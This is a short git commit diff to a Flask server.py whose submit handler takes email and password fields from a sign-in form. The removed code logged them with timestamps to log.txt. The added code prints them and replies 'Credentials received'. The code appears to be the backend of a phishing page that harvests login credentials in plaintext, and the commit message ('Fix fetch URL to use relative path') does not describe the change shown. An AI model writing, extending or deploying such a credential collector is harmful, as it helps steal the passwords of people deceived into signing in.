cb161e06bfab59a5cf177e438fde63b77e386b51
Aghod <ejedennis07@gmail.com>
2025-07-28 04:42:32 +0100

    Fix fetch URL to use relative path

--- server.py
+++ server.py
@@ -1,10 +1,9 @@
-from flask import Flask, request, jsonify, render_template
-from datetime import datetime
+from flask import Flask, render_template, request, jsonify
 
 app = Flask(__name__)
 
 @app.route('/')
-def home():
+def index():
     return render_template('index.html')
 
 @app.route('/password')
@@ -16,11 +15,5 @@ def submit():
     data = request.get_json()
     email = data.get('email')
     password = data.get('password')
-
-    with open("log.txt", "a") as f:
-        f.write(f"{datetime.now()} - Email: {email} | Password: {password}\n")
-
-    return jsonify({"message": "Thanks for signing in."})
-
-if __name__ == '__main__':
-    app.run(debug=True)
+    print(f"Email: {email}, Password: {password}")
+    return jsonify({'message': 'Credentials received'})
